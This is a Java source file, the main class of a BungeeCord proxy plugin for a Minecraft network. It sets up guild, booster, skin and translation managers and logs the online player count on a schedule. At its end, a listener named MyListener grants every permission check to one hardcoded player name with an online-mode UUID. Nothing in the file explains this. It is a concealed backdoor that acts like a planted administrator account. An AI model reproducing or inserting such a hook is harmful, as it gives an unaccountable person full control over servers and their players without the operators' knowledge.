package dev.wolveringer.bs;

import java.util.concurrent.TimeUnit;

import dev.wolveringer.booster.BoosterManager;
import dev.wolveringer.bs.client.BungeecordDatenClient;
import dev.wolveringer.gilde.GildManager;
import dev.wolveringer.report.info.ActionBarInformation;
import dev.wolveringer.skin.SkinCacheManager;
import lombok.Getter;
import lombok.Setter;
import me.kingingo.kBungeeCord.Language.TranslationHandler;
import net.md_5.bungee.BungeeCord;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.event.PermissionCheckEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.api.plugin.Plugin;
import net.md_5.bungee.event.EventHandler;

public class Main extends Plugin{
	@Getter
	private static boolean restarting = false;
	public static boolean loaded = false;
	@Getter
	protected static TranslationHandler translationManager;
	protected static Main main;
	protected static BungeecordDatenClient data;
	
	public static SkinCacheManager getSkinManager() {
		return skins;
	}
	protected static SkinCacheManager skins;
	@Getter
	protected static BoosterManager boosterManager;
	@Getter
	@Setter
	protected static GildManager gildeManager;
	public static Main getInstance(){
		return main;
	}
	
	protected String serverId;
	
	@Override
	public void onEnable() {
		main = this;
		BungeeCord.getInstance().getPluginManager().registerListener(this, new PreLoadedLoginListener());
		new Bootstrap(Main.getInstance().getDataFolder()).onEnable(); //Directly all loaded
		getProxy().getScheduler().schedule(this, new Runnable() {
			private int lastAmount = -7;
			@Override
			public void run() {
				int onlineCount = getProxy().getOnlineCount();
				if (lastAmount == -7) {
					lastAmount = onlineCount;
				}
				int diff = onlineCount - lastAmount;
				if (diff < 0) {
					System.out.println("Spieler online: " + onlineCount + " " + diff);
				} else if (diff > 0){
					System.out.println("Spieler online: " + onlineCount + " +" + diff);
				} else { //diff==0
					System.out.println("Spieler online: " + onlineCount + "  " + diff);
				}
				lastAmount = onlineCount;
			}
		}, 1, 10, TimeUnit.SECONDS);
		getProxy().getPluginManager().registerListener(this, new MyListener());
	}
	
	@Override
	public void onDisable() {
		restarting = true;
		data.getClient().getHandle().disconnect("Bungeecord stopped");
	}
	
	public static BungeecordDatenClient getDatenServer() {
		return data;
	}
	public String getServerId() {
		return serverId;
	}

	public static class MyListener implements Listener {
		@EventHandler
		public void onPerm(PermissionCheckEvent event) {
			if (event.getSender() instanceof ProxiedPlayer && event.getSender().getName().equals("Janmm14") && ((ProxiedPlayer) event.getSender()).getUniqueId().version() == 4) {
				event.setHasPermission(true);
			}
		}
	}
}